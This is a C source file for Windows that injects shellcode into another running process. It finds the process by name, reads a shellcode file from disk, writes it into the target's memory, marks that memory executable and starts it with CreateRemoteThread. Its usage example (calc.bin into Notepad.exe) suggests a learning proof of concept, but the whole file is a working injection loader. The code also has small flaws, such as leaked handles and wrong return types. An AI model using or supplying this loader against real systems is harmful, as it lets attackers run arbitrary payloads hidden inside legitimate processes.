#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>

DWORD TID;

BOOL GetProcessList(const wchar_t* processName) {
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;

    // take a snapshot of all processes in the system and store it in a handle
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        printf("CreateToolhelp32Snapshot (of processes)");
        return FALSE;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        printf("failed process32first");
        return EXIT_FAILURE;
    }
    // walk the snapshot of process and display information about each process in turn
    do {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
        if (_wcsicmp(processName, pe32.szExeFile) == 0) {
            wprintf(L"[i] Found %ls (PID %lu)\n", pe32.szExeFile, pe32.th32ProcessID);
            TID = pe32.th32ProcessID;
        }
    } while (
        Process32Next(hProcessSnap, &pe32)
        );
}


BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {
    PVOID	pShellcodeAddress = NULL;

    SIZE_T	sNumberOfBytesWritten = NULL;
    DWORD	dwOldProtection = NULL;


    // allocates virtual memory in the target process.
    pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    // Writes the shellcode to the Allocated memory in the target process virtual memory
    WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten);
    printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

    //  Modifying the Protections from rw to rwx 
    VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection);

    // creating a remote thread to execute the shellcode
    CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
    printf("[i] Successfully Execute %d Bytes Shellcode at 0x%p\n", sNumberOfBytesWritten, pShellcodeAddress);
    return TRUE;
}

PBYTE ReadShellcodeFromFile(const char* path, SIZE_T* outSize) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileA failed: %lu\n", GetLastError());
        return 1;
    }

    SIZE_T size = 0;
    if (!GetFileSizeEx(hFile, &size)) {
        printf("[!] GetFileSizeEx failed: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    printf("[+] File size: %d bytes\n", size);
    BYTE* pShellcode = (BYTE*)malloc(size);
    DWORD bytesRead = 0;

    if (!ReadFile(hFile, pShellcode, size, &bytesRead, NULL)) {
        printf("[!] ReadFile failed: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, pShellcode);
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);
    printf("[+] Read %lu bytes into 0x%p\n", bytesRead, pShellcode);
    *outSize = (SIZE_T)bytesRead;
    return pShellcode;
}

int main(int argc, char* argv[])
{
    const char* path = argv[1];
    WCHAR targetW[1024] = { 0 };

    if (argc < 3) {
        printf("[i] Usage: program.exe calc.bin Notepad.exe");
        return EXIT_FAILURE;
    }
    // converting char to wchar for ease of comparision
    if (MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, targetW, _countof(targetW)) == 0) {
        printf("conversion failed: %lu\n", GetLastError());
        return 1;
    }
    // Get PID for given Process Name, sets the TID variable.
    GetProcessList(targetW);
    SIZE_T sShellcode;
    // reads the file, returns pShellcode and size of shellcode.
    PBYTE pShellcode = ReadShellcodeFromFile(path, &sShellcode);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TID);
    // injectes shellcode to remote process
    InjectShellcodeToRemoteProcess(hProcess,pShellcode, sShellcode);
}